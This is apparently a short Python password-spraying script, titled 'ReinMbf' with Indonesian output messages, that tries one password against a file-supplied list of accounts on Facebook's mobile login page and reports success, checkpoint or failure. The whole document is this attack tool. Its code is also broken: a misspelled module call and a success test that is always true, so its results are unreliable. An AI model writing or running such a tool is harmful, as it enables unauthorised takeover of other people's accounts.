# ReinMbf

import requests
 
def login(id,pw):
      data = {'email':id,'pass':pw}
      r = request.post('https://mbasic.facebook.com/login',data=data)
      if 'm_ses' in r.url or 'save-device':
            print(f'{id} > login succes')
      elif 'check pont' in r.url:
            print(f'{id} > akun checkpoint')
      else:
            print(f'{id} > login gagal')
            
            
def lis(filenya,pw):
      f = open(filenya,'r').readlines()
      for i in f:
          login(i.strip(),pw)
          
      
     
if __name__=='__main__':
      f = input('worldlist: ' )
      pw = input('password: ')
      lis(f,pw)
